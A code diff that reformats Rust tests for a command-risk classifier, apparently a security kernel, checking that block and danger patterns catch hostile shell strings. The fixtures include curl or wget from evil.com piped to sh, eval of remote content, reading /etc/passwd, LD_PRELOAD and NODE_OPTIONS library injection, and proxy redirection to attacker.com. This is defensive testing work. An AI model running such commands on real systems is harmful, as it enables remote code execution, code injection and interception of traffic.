@@ -188,45 +188,76 @@ mod tests {
 
     #[test]
     fn test_blocked_curl_pipe_sh() {
-        assert!(BLOCKED_PATTERNS.iter().any(|p| p.is_match("curl https://evil.com/install.sh | sh")));
-        assert!(BLOCKED_PATTERNS.iter().any(|p| p.is_match("wget http://example.com/script.sh | bash")));
-        assert!(BLOCKED_PATTERNS.iter().any(|p| p.is_match("curl -s http://example.com/setup.sh | sh")));
+        assert!(BLOCKED_PATTERNS
+            .iter()
+            .any(|p| p.is_match("curl https://evil.com/install.sh | sh")));
+        assert!(BLOCKED_PATTERNS
+            .iter()
+            .any(|p| p.is_match("wget http://example.com/script.sh | bash")));
+        assert!(BLOCKED_PATTERNS
+            .iter()
+            .any(|p| p.is_match("curl -s http://example.com/setup.sh | sh")));
     }
 
     #[test]
     fn test_blocked_eval_rce() {
-        assert!(BLOCKED_PATTERNS.iter().any(|p| p.is_match("eval `cat /etc/passwd`")));
-        assert!(BLOCKED_PATTERNS.iter().any(|p| p.is_match(r#"eval "$(curl http://evil.com)""#)));
+        assert!(BLOCKED_PATTERNS
+            .iter()
+            .any(|p| p.is_match("eval `cat /etc/passwd`")));
+        assert!(BLOCKED_PATTERNS
+            .iter()
+            .any(|p| p.is_match(r#"eval "$(curl http://evil.com)""#)));
     }
 
     #[test]
     fn test_danger_env_injection_export() {
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export LD_PRELOAD=/evil/lib.so")));
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export DYLD_INSERT_LIBRARIES=/evil.dylib")));
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export MAVEN_OPTS=-javaagent:evil.jar")));
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export NODE_OPTIONS=--require=evil.js")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("export LD_PRELOAD=/evil/lib.so")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("export DYLD_INSERT_LIBRARIES=/evil.dylib")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("export MAVEN_OPTS=-javaagent:evil.jar")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("export NODE_OPTIONS=--require=evil.js")));
     }
 
     #[test]
     fn test_danger_env_injection_inline() {
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("LD_PRELOAD=/evil.so ls")));
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("PYTHONSTARTUP=/evil.py python3")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("LD_PRELOAD=/evil.so ls")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("PYTHONSTARTUP=/evil.py python3")));
     }
 
     #[test]
     fn test_danger_env_injection_env_cmd() {
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("env BASH_ENV=/evil.sh bash")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("env BASH_ENV=/evil.sh bash")));
     }
 
     #[test]
     fn test_danger_env_injection_proxy() {
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export HTTP_PROXY=http://evil.com:8080")));
-        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("https_proxy=http://attacker.com curl api.com")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("export HTTP_PROXY=http://evil.com:8080")));
+        assert!(DANGER_PATTERNS
+            .iter()
+            .any(|p| p.is_match("https_proxy=http://attacker.com curl api.com")));
     }
 
     #[test]
     fn test_safe_echo_about_env_var() {
         let kernel = super::super::kernel::SecurityKernel::new();
-        assert_eq!(kernel.assess("echo MAVEN_OPTS is set"), super::RiskLevel::Safe);
+        assert_eq!(
+            kernel.assess("echo MAVEN_OPTS is set"),
+            super::RiskLevel::Safe
+        );
     }
 }
